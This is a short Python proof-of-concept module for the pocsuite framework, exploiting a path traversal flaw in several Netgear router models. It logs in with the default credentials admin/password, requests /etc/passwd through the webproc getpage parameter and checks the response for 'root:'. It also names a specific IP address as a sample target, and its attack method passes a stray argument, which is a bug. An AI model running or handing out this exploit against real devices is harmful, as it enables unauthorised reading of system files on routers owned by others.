#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register



class TestPOC(POCBase):
    name = "Netgear WNR500/WNR612v3/JNR1010/JNR2010 Path Traversal"
    vulID = ''
    author = ['sebao']
    vulType = 'Path Traversal'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/40737/'
    desc = 'Module exploits Netgear WNR500/WNR612v3/JNR1010/JNR2010 Path Traversal vulnerability which allows to read any file on the system.'

    vulDate = ''
    createDate = '2017-10-26'
    updateDate = '2017-10-26'

    appName = 'Netgear'
    appVersion = 'WNR500/WNR612v3/JNR1010/JNR2010'
    dork = ''
    appPowerLink = 'http://www.netgear.com/'
    samples = ['http://27.147.149.250:8080']

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        s = req.Session()
        url = self.url + "/cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us&var:language=en_us&var:page=BAS_bpa"
        username = 'admin'
        password = 'password'
        s.get(url, auth=(username, password))
        resp = s.get(url,auth=(username,password))

        if 'root:' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
